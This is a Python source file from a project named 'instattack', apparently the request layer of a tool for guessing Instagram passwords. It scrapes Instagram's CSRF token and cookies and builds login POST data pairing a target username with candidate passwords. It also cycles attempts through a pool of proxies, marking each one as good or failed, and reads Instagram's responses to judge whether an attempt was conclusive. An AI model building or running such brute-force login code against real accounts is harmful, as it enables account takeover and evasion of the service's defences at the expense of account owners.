import aiohttp
import asyncio
import contextlib
import requests
import re

from instattack import settings
from instattack.exceptions import ClientResponseError
from instattack.base import MethodHandler
from instattack.login import constants

from .exceptions import InvalidResponseJson, InstagramResultError
from .models import InstagramResult


"""
TODO:
----
Look into asyncio.shield() for database transactions.

ClientSession
-------------
When ClientSession closes at the end of an async with block (or through
a direct ClientSession.close() call), the underlying connection remains
open due to asyncio internal details. In practice, the underlying
connection will close after a short while. However, if the event loop is
stopped before the underlying connection is closed, an ResourceWarning:
unclosed transport warning is emitted (when warnings are enabled).

To avoid this situation, a small delay must be added before closing the
event loop to allow any open underlying connections to close.
<https://docs.aiohttp.org/en/stable/client_advanced.html>
"""


class CS:

    _cs: aiohttp.ClientSession

    def __init__(self, cookies):
        self._cs = ClientSession(connector=self._connector, cookies=cookies)

    @property
    def _connector(self):
        return aiohttp.TCPConnector(
            ssl=False,
            force_close=True,
            # limit=self.limit,
            # limit_per_host=self.limit_per_host,
            enable_cleanup_closed=True,
        )

    async def post(self, url):
        async with self._cs.post(url) as resp:
            return await resp.json()

    async def close(self):
        await self._cs.close()


class RequestHandler(MethodHandler):

    def __init__(self, config, proxy_handler, **kwargs):
        super(RequestHandler, self).__init__(**kwargs)
        self.proxy_handler = proxy_handler

        self._headers = None
        self._cookies = None
        self._token = None

        if self.__method__ is None:
            raise RuntimeError('Method should not be null.')

        config = config.for_method(self.__method__)
        self.limit = config['connection']['limit']
        self.timeout = config['connection']['timeout']
        self.limit_per_host = config['connection']['limit_per_host']

    @property
    def _connector(self):
        return aiohttp.TCPConnector(
            ssl=False,
            force_close=True,
            limit=self.limit,
            limit_per_host=self.limit_per_host,
            enable_cleanup_closed=True,
        )

    @property
    def _timeout(self):
        return aiohttp.ClientTimeout(
            total=self.timeout
        )

    @property
    def headers(self):
        return self._headers

    @property
    def token(self):
        return self._token

    async def cookies(self):
        if not self._cookies:
            # TODO: Set timeout to the token timeout.
            sess = aiohttp.ClientSession(connector=self._connector)
            resp = await sess.get(settings.INSTAGRAM_URL)
            text = await resp.text()

            self._token = re.search('(?<="csrf_token":")\w+', text).group(0)
            if not self._token:
                raise RuntimeError('Could not find token.')

            self._cookies = resp.cookies
            self._headers = settings.HEADERS(self._token)
            await sess.close()

        return self._cookies

    async def handle_request_error(self, e, proxy, context):
        """
        AioHTTP Client Exception Reference
        https://docs.aiohttp.org/en/stable/client_reference.html

        ClientError

            These exceptions could happen after we get response from server.
            - ClientResponseError(ClientError)

            These exceptions related to low-level connection problems.
            - ClientConnectionError(ClientError)

                - ServerConnectionError(ClientConnectionError)

                        - ServerDisconnectError(ServerConnectionError)
                        - ServerTimeoutError(ServerConnectionError, asyncio.TimeoutError)

                Subset of connection errors that are initiated by an OSError exception.
                - ClientOSError(ClientConnectionError, OSError)

                    - ClientConnectorError(ClientOSError)

                        - ClientProxyConnectionError(ClientConnectorError)
                        - ClientSSLError(ClientConnectorError) -> Raise Exceptions Here

                            - ClientConnectorCertificateError(ClientSSLError, ssl.SSLError)
                            - ClientConnectorSSLError(ClientSSLError, ssl.CertificateError)
        """
        if isinstance(e, RuntimeError):
            """
            RuntimeError: File descriptor 87 is used by transport
            <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
            """
            self.log.error(e, extra={'context': context})
            return asyncio.create_task(self.proxy_inconclusive(proxy))

        elif isinstance(e, asyncio.CancelledError):
            # Don't want to mark as inconclusive because we don't want to note
            # the last time the proxy was used.
            pass

        elif isinstance(e, (
            aiohttp.ClientProxyConnectionError,
            aiohttp.ServerConnectionError,
        )):
            self.log.error(e, extra={'context': context})
            return asyncio.create_task(self.proxy_error(proxy, e))

        elif isinstance(e, OSError):
            # We have only seen this for the following:
            # >>> OSError: [Errno 24] Too many open files -> Want to sleep
            # >>> OSError: [Errno 54] Connection reset by peer
            if e.errno == 54:
                self.log.error(e, extra={'context': context})
                # Not sure if we want to treat this as an error or what.
                return asyncio.create_task(self.proxy_error(proxy, e))

            elif e.errno == 24:
                self.log.error(e, extra={
                    'context': context,
                    'other': f'Sleeping for {3} seconds...'
                })
                # Not sure if we want to treat this as an error or what.
                return asyncio.create_task(self.proxy_inconclusive(proxy))
            else:
                raise e

    async def proxy_success(self, proxy):
        await proxy.was_success()
        await self.proxy_handler.pool.put(proxy)

    async def proxy_inconclusive(self, proxy):
        await proxy.was_inconclusive()
        await self.proxy_handler.pool.put(proxy)

    async def proxy_error(self, proxy, e):
        await proxy.was_error(e)
        await self.proxy_handler.pool.put(proxy)


class PostRequestHandler(RequestHandler):

    __method__ = 'POST'

    def _login_data(self, password):
        return {
            constants.INSTAGRAM_USERNAME_FIELD: self.user.username,
            constants.INSTAGRAM_PASSWORD_FIELD: password
        }

    async def parse_response_result(self, result, context):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        result = InstagramResult.from_dict(result, context)
        if result.has_error:
            raise InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise InstagramResultError("Inconslusive result.")
            return result

    async def handle_client_response(self, response, context):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status == 400:
            try:
                json = await response.json()
            except ValueError:
                raise InvalidResponseJson(response)
            else:
                return await self.parse_response_result(json, context)
        else:
            try:
                response.raise_for_status()
            except (
                aiohttp.client_exceptions.ClientResponseError,
                aiohttp.ClientResponseError,
                aiohttp.exceptions.ClientResponseError,
            ) as e:
                raise ClientResponseError(response)
            else:
                try:
                    json = await response.json()
                except ValueError:
                    raise InvalidResponseJson(response)
                else:
                    return await self.parse_response_result(json, context)
